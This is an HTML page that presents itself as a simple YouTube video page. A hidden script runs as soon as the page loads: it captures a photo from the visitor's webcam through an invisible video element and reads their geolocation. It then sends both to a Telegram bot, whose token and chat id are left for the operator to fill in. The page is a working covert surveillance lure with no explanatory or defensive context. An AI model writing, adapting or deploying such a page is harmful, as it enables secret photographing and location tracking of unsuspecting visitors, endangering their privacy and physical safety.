<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera, Location, and Video</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: auto;
        }
        .container {
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>YouTube Video</h2>
        <iframe width="560" height="315"
            src="https://www.youtube.com/embed/KL6Qf1Icz1c?si=F86JV4Fpex8AXwkl"
            title="YouTube video player"
            frameborder="0"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowfullscreen>
        </iframe>
    </div>

    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
        const CHAT_ID = 'YOUR_CHAT_ID';

        async function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        async function sendLocationToTelegram(lat, lon) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: lat,
                    longitude: lon
                })
            });
        }

        async function capturePhotoAndLocation() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');

                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(async () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(async (blob) => {
                            await sendPhotoToTelegram(blob);
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg');
                    }, 1500);
                };
            } catch (error) {
                console.error('Camera error:', error);
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    await sendLocationToTelegram(position.coords.latitude, position.coords.longitude);
                }, (err) => {
                    console.error("Location error:", err);
                });
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            capturePhotoAndLocation();
        });
    </script>
</body>
</html>
